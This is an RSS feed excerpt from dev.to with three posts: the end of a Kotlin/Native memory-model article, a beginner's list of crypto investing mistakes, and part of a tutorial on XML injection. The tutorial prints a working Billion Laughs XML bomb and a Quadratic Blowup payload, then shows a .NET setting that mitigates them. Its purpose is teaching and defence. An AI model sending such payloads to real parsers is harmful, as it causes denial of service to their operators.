    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="py"&gt;didRunLambda&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;false&lt;/span&gt;
    &lt;span class="nf"&gt;assertTrue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;NSThread&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isMainThread&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="nf"&gt;doInBackground&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;didRunLambda&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;true&lt;/span&gt; &lt;span class="c1"&gt;// *&lt;/span&gt;
        &lt;span class="nf"&gt;assertFalse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;NSThread&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isMainThread&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="nf"&gt;assertTrue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;didRunLambda&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;However, this will fail at the starred line with an &lt;code&gt;InvalidMutabilityException&lt;/code&gt;. Our &lt;code&gt;doInBackground()&lt;/code&gt; function freezes the lambda, and the new memory model still respects freeze semantics and doesn't allow frozen things to change. That includes the &lt;code&gt;didRunLambda&lt;/code&gt; boolean which is captured from the outer scope.&lt;/p&gt;

&lt;p&gt;So let's create a new backgrounding function. Note that this function works only in the new model, and will fail with an &lt;code&gt;IllegalStateException&lt;/code&gt; if you use the existing strict memory model.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight kotlin"&gt;&lt;code&gt;&lt;span class="k"&gt;fun&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;T&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nf"&gt;doInBackgroundUnfrozen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;action&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="nc"&gt;T&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="nc"&gt;T&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;val&lt;/span&gt; &lt;span class="py"&gt;worker&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nc"&gt;Worker&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="kd"&gt;val&lt;/span&gt; &lt;span class="py"&gt;future&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="n"&gt;worker&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nf"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
        &lt;span class="nc"&gt;TransferMode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;SAFE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
        &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="n"&gt;action&lt;/span&gt; &lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="c1"&gt;// No more freeze() call&lt;/span&gt;
        &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nf"&gt;it&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;future&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Subbing this function into the test allows it to pass in the new model.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight kotlin"&gt;&lt;code&gt;&lt;span class="nd"&gt;@Test&lt;/span&gt; &lt;span class="k"&gt;fun&lt;/span&gt; &lt;span class="nf"&gt;newMemoryTestUnfrozen&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="py"&gt;didRunLambda&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;false&lt;/span&gt;
    &lt;span class="nf"&gt;assertTrue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;NSThread&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isMainThread&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="nf"&gt;doInBackgroundUnfrozen&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;didRunLambda&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="k"&gt;true&lt;/span&gt;
        &lt;span class="nf"&gt;assertFalse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;NSThread&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;isMainThread&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="nf"&gt;assertTrue&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;didRunLambda&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#further-thoughts"&gt;
  &lt;/a&gt;
  Further thoughts
&lt;/h2&gt;

&lt;p&gt;It's pretty neat seeing this in action! As the Kotlin team promised previously, existing code written around &lt;code&gt;freeze()&lt;/code&gt; in the strict memory model still appears to behave the same in the new experimental model. But we also now have the ability to pass unfrozen things across threads. This should mean that, once the model is finalized, existing code won't need to migrate immediately. However, early adopters of the experimental model will likely need to wait for any concurrency libraries they depend on to update, or else they'll still need to handle the existing &lt;code&gt;freeze()&lt;/code&gt; behavior. That work has &lt;a href="https://github.com/Kotlin/kotlinx.coroutines/issues/2797"&gt;already begun&lt;/a&gt; in &lt;code&gt;kotlinx.coroutines&lt;/code&gt;.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#caveats"&gt;
  &lt;/a&gt;
  Caveats
&lt;/h2&gt;

&lt;p&gt;The experimental new memory model is an undocumented preview release. I haven't tried much beyond what's presented here, and I have no idea what limitations or possible issues there are. Use at your own risk! That said, it might be a nice time to try it out, especially if you maintain library code that handles freeze-related logic currently. Be sure to report any bugs you see, and give JetBrains feedback on if it works for you.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#should-i-use-this-in-production"&gt;
  &lt;/a&gt;
  Should I use this in production?
&lt;/h2&gt;

&lt;p&gt;No.&lt;/p&gt;




&lt;p&gt;Thanks for reading! Let me know in the comments if you have questions, or you can reach out to me at &lt;a class="mentioned-user" href="https://dev.to/russhwolf"&gt;@russhwolf&lt;/a&gt;
 on &lt;a href="https://twitter.com/RussHWolf"&gt;Twitter&lt;/a&gt; or the &lt;a href="https://slack.kotlinlang.org"&gt;Kotlin Slack&lt;/a&gt;. And if you find all this interesting, maybe you'd like to &lt;a href="https://touchlab.co/contact-us/"&gt;work with&lt;/a&gt; or &lt;a href="https://touchlab.co/careers-3/"&gt;work at&lt;/a&gt; Touchlab.&lt;/p&gt;

</description>
      <category>kotlin</category>
      <category>kotlinmultiplatform</category>
    </item>
    <item>
      <title>6 crypto investment mistakes I made so you don't have to</title>
      <author>topjer</author>
      <pubDate>Sat, 07 Aug 2021 15:44:32 +0000</pubDate>
      <link>https://dev.to/topjer/6-crypto-investment-mistakes-i-made-so-you-don-t-have-to-1m98</link>
      <guid>https://dev.to/topjer/6-crypto-investment-mistakes-i-made-so-you-don-t-have-to-1m98</guid>
      <description>&lt;p&gt;The crypto world is exciting. Filled to the brim with technological possibilities unimaginable mere 10 years ago. As a result it becomes harder and harder not to dip your toe into these waters if you have even a remote interest in technology. This is at least how it was for me.&lt;/p&gt;

&lt;p&gt;In the spirit of full disclosure I want to say that I find the whole conglomerate of DeFi, CeFi, Dex, blockchain and whatnot more than confusing. It happens rather regularly that I read an article about crypto which I simply do not understand.&lt;br&gt;The incredible opportunities come at a price of great complexity and this great complexity leads to one thing especially in the beginning ...&lt;/p&gt;

&lt;p&gt;Mistakes.&lt;/p&gt;

&lt;p&gt;Thus I want to give you an overview over the mistakes that I have done or just barely gotten away from.&lt;/p&gt;

&lt;h1&gt;Intransparency of value&lt;/h1&gt;

&lt;p&gt;If you delve deeper the matter of crypto and are not just in it to hold some Bitcoin then you might encounter a situation that is similar to the following:&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;Good, my 50 Euro have arrived at Binance. First I will buy some BNB. &lt;em&gt;*buys BNB&lt;/em&gt;*&lt;br&gt;Now I want to transfer that to my wallet. *&lt;em&gt;accepts fees and transfers it&lt;/em&gt;*&lt;br&gt;Sweet, next step: I buy some sweet sweet CAKE over at PancakeSwap. '&lt;em&gt;buys CAKE&lt;/em&gt;'&lt;br&gt;Wait, you can by lottery tickets with CAKE? Gimme five! *&lt;em&gt;buys five tickets&lt;/em&gt;*&lt;br&gt;I always wanted to hold billions of coins. Time to buy some OSM *&lt;em&gt;buys a ridiculous amount of OSM&lt;/em&gt;*&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;After this shopping spree you end up with a bunch of numbers in your wallet. My personally, I rather quickly forget the value these numbers actually hold.&lt;/p&gt;

&lt;p&gt;Is a transaction fee of 0.01 BNB much?&lt;br&gt;How much did I really lose when I spend 5 CAKE on lottery tickets and not win anything?&lt;/p&gt;

&lt;p&gt;I especially noticed that I was sometimes reckless with spending crypto because it was so intangible. Lottery tickets for 0.3 CAKE? Count me in! An NFT for 400 KSM? Interesting! (Not an actual investment of mine)&lt;/p&gt;

&lt;p&gt;So my tip here would be the following: Whenever you want to spent some crypto, first ask yourself how much money that actually is. Once you know that, ask yourself whether you really want to go through with the transaction. This is especially true for transactions where you loose your coins, e.g. because you have to pay fees compared to transactions where you gain an equal amount of another coin.&lt;/p&gt;

&lt;h1&gt;Underestimate transaction fees&lt;/h1&gt;

&lt;p&gt;I want to stress the last point because I fell for that trap too often in the short time that I buy crypto. The worst thing is that you do not even immediately notice that you have fallen for it.&lt;br&gt;This is closely connected to the Intransparency of value I have mentioned before. Even though Meta Mask shows you the maximum gas fees, it can be hard to understand what it means.&lt;/p&gt;

&lt;p&gt;This totally leaves aside the fact that it is easy to confuse a 0.0008 with 0.008 and thus you do not even notice that you spent a 10 times higher fee for a transaction.&lt;/p&gt;

&lt;p&gt;Time for a story. It was the first time I traded crypto outside the safe haven that is a broker. I was ready for the wide world that is crypto and started with &lt;a href="https://pancakeswap.finance/"&gt;PancakeSwap&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;For some time everything was smooth sailing. I could provide liquidity, I could invest in Syrup pools. Life was filled with syrup-like goodness.&lt;/p&gt;

&lt;p&gt;But dark clouds were forming on the horizon. PancakeSwap has a mechanic where you can claim a bounty which activates the compounding function for the Auto pool. For this interaction you of course have to pay a small fee but simply wait for a bounty that is higher than the gas fees you have to pay. Problem solved&lt;br&gt;Nothing is as tempting as the promise of free money so I tried to claim the bounty … and failed.&lt;/p&gt;

&lt;p&gt;As a side note, it can be really hard or virtually impossible to understand why a transaction failed. Especially in the beginning. In hindsight I think the problem was that Meta Mask was calculating the gas fees incorrectly or the bounty has already been claimed.&lt;/p&gt;

&lt;p&gt;So I did the most natural thing to do in this situation. I kept on trying over and over again. Every time I got the same outcome.&lt;br&gt;At one point I decided to stop. Not because I came too my senses but I made a cruel discovery. For each failed transaction I had to pay gas fees!&lt;/p&gt;

&lt;p&gt;Here an explanation why you have to pay for failed transactions on the ethereum network. I assume&lt;br&gt;that similar arguments also apply to other networks:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The Ethereum network requires gas to execute transactions. When you send tokens, interact with a contract, send ETH, or do anything else on the blockchain, you must pay for that computation. That payment is calculated in gas, and gas is always paid in ETH.&lt;/p&gt;
&lt;p&gt;You are paying for the computation, regardless of whether your transaction succeeds or fails. Even if it fails, the miners must validate and execute your transaction, which takes computational power. You must pay for that computation, just like you would pay for a successful transaction.&lt;br&gt;&lt;/p&gt;
&lt;cite&gt;&lt;p&gt;https://metamask.zendesk.com/hc/en-us/articles/360045439051-Why-did-I-pay-gas-fees-for-a-failed-transaction-&lt;/p&gt;&lt;/cite&gt;
&lt;/blockquote&gt;

&lt;p&gt;In the end I had 6 failed transactions. The most expensive one costed me 0.69$. This is pretty high considering that I was trying to claim a bounty of 0.25$.&lt;/p&gt;

&lt;p&gt;So always make sure you know how much you are paying for gas and if the transaction is not time sensitive then try to postpone it to another time with potentially better gas prices.&lt;/p&gt;

&lt;h1&gt;Unaware of "The others"&lt;/h1&gt;

&lt;p&gt;The internet is full of stories of people who made a ton of money. One smart investment. Getting into this one crypto that no one saw coming early. BOOM! Big returns. Big numbers. Incredible riches.&lt;/p&gt;

&lt;p&gt;If it is not the story of people "having made it" then it is the promise that there is this one particular coin that will blow up soon. It is sooooo good it is only a question of time until it goes to the moon. &lt;br&gt;Side note: People advertising a coin are usually heavily invested in that coin themselves and would therefore profit of other people buying it as well. &lt;/p&gt;

&lt;p&gt;In your head you are already thinking about where the perfect place for the new TV is that you will buy once you have become crypto rich as well. &lt;br&gt;But before you drift too deeply into this crypto dream I want to tell you something about the survivorship bias .&lt;/p&gt;

&lt;p&gt;Let us start with with its definition, it is&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;the logical error of concentrating on the people or things that made it past some selection process and overlooking those that did not, typically because of their lack of visibility. &lt;/p&gt;
&lt;cite&gt;&lt;p&gt;https://en.wikipedia.org/wiki/Survivorship_bias&lt;/p&gt;&lt;/cite&gt;
&lt;/blockquote&gt;

&lt;p&gt;People that lost most of their investment because they put it into "the next big thing" will probably not brag about it on the internet. Maybe because they are ashamed. &lt;/p&gt;

&lt;p&gt;"People will think I am dumb and not as smart as that other guy" might be a thought that is creeping up in their head. &lt;br&gt;Or they are simply too angry and want nothing to have to do with this whole crypto thing.&lt;br&gt;Lastly, you probably do not see these posts because they do not sell as well. They are not getting upvoted and&lt;br&gt;people who run a coin will hardly advertise the post of someone who lost everything with their coin.&lt;/p&gt;

&lt;p&gt;So for starters I would advise you to keep in mind that for everyone who made money with a coin there&lt;br&gt;must be someone who lost money with that coin. This is of course somewhat of an oversimplification but the core holds true.&lt;/p&gt;

&lt;p&gt;We can also address this from another angle. If you have already some investment experience then ask yourself how many of your losses you have talked about on the internet. I would assume that the answer is at least 'Not each one' and probably more along the lines of 'None'.&lt;/p&gt;

&lt;p&gt;A more realistic view would now be to assume this to be true for everyone you come across. Everyone has some investment skeletons in the closet and rich people usually have big closets ...&lt;/p&gt;

&lt;h1&gt;Get rich quick mentality&lt;/h1&gt;

&lt;p&gt;This is an extension of the last point. So lets say that you are aware that people lose money. Not everyone&lt;br&gt;can be a winner. Still you could be one if you just approached it right.&lt;/p&gt;

&lt;p&gt;How could you not want big numbers and prestige for yourself. So you start looking at dirt cheap coins with&lt;br&gt;zero utility and think: "Maybe this is it. Maybe if I invest just a tiny bit then it would not be too bad if the coins goes to zero. Yet it has potential to blow up really big."&lt;/p&gt;

&lt;p&gt;Or you become part of a "pump and dump" community. The people are very nice and they guarantee success. They have done that many times before and everyone in there swears they have been making money.&lt;/p&gt;

&lt;p&gt;For those of you who do not know what those communities do. They coordinate buying a certain coin. This results in an increase in price. Maybe they also spread the news like "XYZ is totally blowing up. You must get in now!"&lt;br&gt;Either way, other people will start noticing the increase in price and will buy as well. That is the moment when the community starts selling the coin to these new buyers for a higher price. Making a profit in the process (and letting those new buyers plunge into their doom).&lt;/p&gt;

&lt;p&gt;In case you are wondering: Yes, this is market manipulation and would have severe consequences in other markets like the stock market for example. But good thing crypto is mostly unregulated. Am I right?&lt;br&gt;Just hope that the community you are in does not have an inner circle. An elitist group that has bought the coin before and then is dumping their coins onto you. Making you the poor fool plunging into his doom.&lt;/p&gt;

&lt;p&gt;I think the point I am trying to make is that a get-rich-quick-mentality makes you vulnerable to scams. Stay away from riskier investments. Even if people claim there is zero risk involved understand this: you get a higher return on your investment the more risk you are willing to take. A high yielding investment without risk does not exist. Here I would like to ignore arbitrage situation for the moment which would be return at zero risk but that is a very special situation.&lt;/p&gt;

&lt;p&gt;Here is my recommendation: In the beginning buy one of those established coins and hold it for a while. Get a feeling for the ups and downs of the crypto market. You can invest in shit coins. But only amounts that you can stomach loosing. Also do not spend all your time researching the next coin that is blowing up. Instead learn more about crypto. Because this world is actually quite fascinating once you look past making quick profit.&lt;/p&gt;

&lt;h1&gt;It always pays to take a second look&lt;/h1&gt;

&lt;p&gt;Let me make that crystal clear: Always make sure you are sending your crypto to the correct adress!&lt;/p&gt;

&lt;p&gt;Picture this: you want to send a noteworthy amount of crypto from one wallet to the other. You have done that before. No big deal!&lt;br&gt;You click send in one wallet and then you wait. But your crypto does not arrive in the other wallet. Nervousness is rising. You decide to check the transaction which luckily you can because a block chain essentially is a vault made out of glass. Comparing the target address from the transaction with you intended target address you realize that one digit is false. Do you know what that means?&lt;/p&gt;

&lt;p&gt;You crypto is gone! With a high probability will this wallet not belong to anyone. Even if it would belong to someone it would be nigh impossible to contact that person.&lt;/p&gt;

&lt;p&gt;I am very grateful that this situation did not yet happen to me. Once I almost thought that I lost my money when trying to transfer SHIB from Binance to my wallet. In the end it turned out that I did not add the correct currency to Meta Mask and that was why it did not show my transferred crypto.&lt;/p&gt;

&lt;p&gt;The take away point: If you intend to send a bigger amount of money or if you do your first transaction to a wallet it might be a good a idea to test it with a small transaction first. Alternatively it could be possible to simulate the transaction on the testnet if that is available for you crypto of choice.&lt;/p&gt;

&lt;h1&gt;Nothing but a speck of dust&lt;/h1&gt;

&lt;p&gt;It is wise to start with small amounts when investing into crypto. This helps to get a feeling for how the markets move.&lt;/p&gt;

&lt;p&gt;But it also comes with the own set of problems. The following two points are more of a word-of-warning, things to be aware about and not concrete tips.&lt;/p&gt;

&lt;h2&gt;The transaction is too small compared to the fees&lt;/h2&gt;

&lt;p&gt;For me, everything started with buying 10 Euros worth of Ethereum. Having this money in my Coinbase wallet was exhilarating. It felt like I was holding a piece of future in my hand. &lt;br&gt;That it until I wanted to move that ETH into my MetaMask wallet and saw that I would have to pay 8 Euros of fees. Guess what! Those ETH stayed with Coinbase for a long time.&lt;/p&gt;

&lt;h2&gt;Your holding amount is to small to do what you want to do&lt;/h2&gt;

&lt;p&gt;It happened to me way to often that I wanted to do a certain transaction but could not do it because it required bigger amounts then I was holding.&lt;/p&gt;

&lt;p&gt;Let me give you an example: I have a some money invested in &lt;a href="https://drip.community/"&gt;Drip&lt;/a&gt; where I get 1% per day on my staked amount. Instead of reinvesting my interest, I claimed it accidentally. When I wanted to reinvest it I couldn't because only investments of more than 1 drip are allowed. So now I have 0.16 Drip lying around and I have no idea what to do with it.&lt;/p&gt;

&lt;h1&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;There you have it. These are 6 beginner pitfalls that you hopefully can avoid now that you are aware of them. None of those hurt me too much but it either resulted in burning some money or loosing some hair because of the stress they caused me.&lt;/p&gt;

&lt;p&gt;Feel free to share your beginner mistakes with me in the comments and it case that it was not clear already because I was talking about "mistakes", nothing in this article should be seen as investment advice.&lt;/p&gt;

</description>
      <category>crypto</category>
      <category>beginners</category>
    </item>
    <item>
      <title>Web Services Security: XML Injection </title>
      <author>Muhammad Ahmad</author>
      <pubDate>Sat, 07 Aug 2021 15:41:49 +0000</pubDate>
      <link>https://dev.to/0xf10yd/web-services-security-xml-injection-j4d</link>
      <guid>https://dev.to/0xf10yd/web-services-security-xml-injection-j4d</guid>
      <description>&lt;h2&gt;
  &lt;a href="#what-is-xml-definition-and-further-details"&gt;
  &lt;/a&gt;
  What is XML: definition and further details
&lt;/h2&gt;

&lt;p&gt;XML stands for eXtensible Markup Language, a derivative of SGML (upon which HTML is also based) and used to represent structured data objects as human-readable text. XML is designed as a format for the storage and transmission of data. XML is customizable (extensible) so that it can be tailored for any application by defining how data is organized and represented.&lt;/p&gt;

&lt;p&gt;Here's an example of a simple XML file:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;&amp;lt;?xml version="1.0" encoding="UTF-8"?&amp;gt;
&amp;lt;message&amp;gt;
  &amp;lt;to&amp;gt;receiver&amp;lt;/to&amp;gt;
  &amp;lt;from&amp;gt;sender&amp;lt;/from&amp;gt;
  &amp;lt;body&amp;gt;data&amp;lt;/body&amp;gt;
&amp;lt;/message&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The first line of the text file identifies the file as an XML document and declares that it is encoded as Unicode “UTF-8” characters. As a best practice, every XML file should begin with such an identification though it's not strictly required.&lt;/p&gt;

&lt;p&gt;All applications should use a standard parser library to consume XML text like this example. The parser converts constructed text file streams into a tree structure representation of the data that abstracts away the syntactic details of the source for the application to process directly. For the example above, an XML parser would create a data structure as shown below:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--z2BL8hy2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/byz94f4alvgx2cmjc48e.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--z2BL8hy2--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/byz94f4alvgx2cmjc48e.png" alt="xml ds"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Using the tree structure, software can easily identify the root element (message) and that it is well-formed having the three expected sub-elements, each with its corresponding text value available for processing. &lt;/p&gt;

&lt;p&gt;Applications use XML as a handy data format for all manner of custom data representations, as well as a number of standard formats that are designed on top of XML. Put in mind that when handling any of the following kinds of data (and many more than can be listed here, as well) that under the covers an XML parser is likely running and hence these security issues may very well apply.&lt;/p&gt;

&lt;p&gt;As well, there're many other data formats that are based on XML including but not limited to:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;SOAP&lt;/li&gt;
&lt;li&gt;.NET configuration files&lt;/li&gt;
&lt;li&gt;Websphere trace files&lt;/li&gt;
&lt;li&gt;WDSL&lt;/li&gt;
&lt;li&gt;RSS&lt;/li&gt;
&lt;li&gt;SVG&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#xml-injection-attacks-common-types"&gt;
  &lt;/a&gt;
  XML Injection Attacks: Common Types
&lt;/h2&gt;

&lt;p&gt;The following attacks described are applicable to any application that parses XML input.&lt;br&gt;
Specifically, the attacker creates malformed XML that the application consumes with the intention of tricking the XML parser to cause some harmful action.&lt;br&gt;
XML parsers with bugs, or that are misconfigured and hence vulnerable to manipulation, are generally susceptible to two kinds of attacks: &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;XML Bombs (Billion laughs attack): The XML parser may crash or execute incorrectly given certain input data, resulting in a Denial of Service attack.&lt;/li&gt;
&lt;li&gt;XXE Disclosure (XML external entity): The XML parser may mistakenly leak sensitive information.&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;p&gt;Keep in mind that attacks may utilize perfectly valid XML, or possibly malformed XML (unless the parser strictly detects and rejects it safely).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;
  &lt;a href="#xml-bomb-attack"&gt;
  &lt;/a&gt;
  XML Bomb Attack
&lt;/h3&gt;

&lt;p&gt;An XML Bomb may be valid XML, but is designed so as to cause the XML parser, or the application processing its output, to hang or crash executing.&lt;br&gt;
For example, consider the Billion Laughs Attack that consists of a short XML file that manages to expand under XML parsing into some 3 gigabytes of data. The large resultant data typically crashes any application, and it is easy to see how the data size could be scaled arbitrarily larger.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;&amp;lt;?xml version="1.0"?&amp;gt;
&amp;lt;!DOCTYPE lolz [
&amp;lt;!ENTITY lol "lol"&amp;gt;
  &amp;lt;!ENTITY lol2 "&amp;amp;lol;&amp;amp;lol;&amp;amp;lol;&amp;amp;lol;&amp;amp;lol;&amp;amp;lol;&amp;amp;lol;&amp;amp;lol;&amp;amp;lol;&amp;amp;lol;"&amp;gt;
  &amp;lt;!ENTITY lol3 "&amp;amp;lol2;&amp;amp;lol2;&amp;amp;lol2;&amp;amp;lol2;&amp;amp;lol2;&amp;amp;lol2;&amp;amp;lol2;&amp;amp;lol2;&amp;amp;lol2;&amp;amp;lol2;"&amp;gt;
  &amp;lt;!ENTITY lol4 "&amp;amp;lol3;&amp;amp;lol3;&amp;amp;lol3;&amp;amp;lol3;&amp;amp;lol3;&amp;amp;lol3;&amp;amp;lol3;&amp;amp;lol3;&amp;amp;lol3;&amp;amp;lol3;"&amp;gt;
  &amp;lt;!ENTITY lol5 "&amp;amp;lol4;&amp;amp;lol4;&amp;amp;lol4;&amp;amp;lol4;&amp;amp;lol4;&amp;amp;lol4;&amp;amp;lol4;&amp;amp;lol4;&amp;amp;lol4;&amp;amp;lol4;"&amp;gt;
  &amp;lt;!ENTITY lol6 "&amp;amp;lol5;&amp;amp;lol5;&amp;amp;lol5;&amp;amp;lol5;&amp;amp;lol5;&amp;amp;lol5;&amp;amp;lol5;&amp;amp;lol5;&amp;amp;lol5;&amp;amp;lol5;"&amp;gt;
  &amp;lt;!ENTITY lol7 "&amp;amp;lol6;&amp;amp;lol6;&amp;amp;lol6;&amp;amp;lol6;&amp;amp;lol6;&amp;amp;lol6;&amp;amp;lol6;&amp;amp;lol6;&amp;amp;lol6;&amp;amp;lol6;"&amp;gt;
  &amp;lt;!ENTITY lol8 "&amp;amp;lol7;&amp;amp;lol7;&amp;amp;lol7;&amp;amp;lol7;&amp;amp;lol7;&amp;amp;lol7;&amp;amp;lol7;&amp;amp;lol7;&amp;amp;lol7;&amp;amp;lol7;"&amp;gt;
  &amp;lt;!ENTITY lol9 "&amp;amp;lol8;&amp;amp;lol8;&amp;amp;lol8;&amp;amp;lol8;&amp;amp;lol8;&amp;amp;lol8;&amp;amp;lol8;&amp;amp;lol8;&amp;amp;lol8;&amp;amp;lol8;"&amp;gt;
]&amp;gt;
&amp;lt;lolz&amp;gt;&amp;amp;lol9;&amp;lt;/lolz&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Another example of a similar attack is the Quadratic Blowup Attack, which can also quickly expand to 2.5 gigabytes. &lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The “...” symbol replaces more repetitions below.&lt;br&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;&amp;lt;?xml version="1.0"?&amp;gt;
&amp;lt;!DOCTYPE kaboom [
  &amp;lt;!ENTITY a "aaaaaaaaaaaaaaaaaa..."&amp;gt;
]&amp;gt;
&amp;lt;kaboom&amp;gt;&amp;amp;a;&amp;amp;a;&amp;amp;a;&amp;amp;a;&amp;amp;a;&amp;amp;a;&amp;amp;a;&amp;amp;a;&amp;amp;a;...&amp;lt;/kaboom&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#mitigating-xml-bombs"&gt;
  &lt;/a&gt;
  Mitigating XML Bombs
&lt;/h3&gt;

&lt;p&gt;The best way to avoid XML Bombs is for the application to configure the XML parser to disable inline expansion of entities. Without inline expansion the size increase will not be available to the attacker and these attacks will be rendered harmless.&lt;br&gt;
When the application requires entity expansion, or if the XML parser does not provide this configuration option, set the parser to enforce a limit on the size of expanded entities.&lt;br&gt;
Here is sample code for the standard .NET 4.0 XML parser to disable inline DTDs:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
XmlReader reader = XmlReader.Create(stream, settings);
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;With this configuration, either of the XML Bombs would not result in excessive memory consumption.&lt;br&gt;
Instead of the gigabytes of data, the data structure would show the structure of the entity expansion as it is expressed in the source XML.&lt;/p&gt;

&lt;blockquote&gt;
